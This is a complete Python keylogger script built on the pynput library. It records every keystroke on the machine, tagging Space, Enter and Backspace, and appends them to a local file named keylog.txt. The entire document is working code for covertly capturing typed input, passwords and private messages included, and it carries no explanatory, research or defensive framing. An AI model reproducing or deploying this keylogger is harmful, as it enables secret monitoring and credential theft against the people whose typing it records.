import pynput
from pynput.keyboard import Key, Listener

# File to save keystrokes
LOG_FILE = "keylog.txt"

# Function to write keystrokes to a file
def log_key(key):
    try:
        with open(LOG_FILE, "a") as file:
            # Replace special characters like Enter and Space for readability
            if key == Key.space:
                file.write(" [SPACE] ")
            elif key == Key.enter:
                file.write(" [ENTER] ")
            elif key == Key.backspace:
                file.write(" [BACKSPACE] ")
            else:
                file.write(f" {key.char} ")  # For normal characters
    except AttributeError:  # Handles special keys
        with open(LOG_FILE, "a") as file:
            file.write(f" {str(key)} ")

# Start listening to keystrokes
def main():
    with Listener(on_press=log_key) as listener:
        listener.join()

if __name__ == "__main__":
    main()
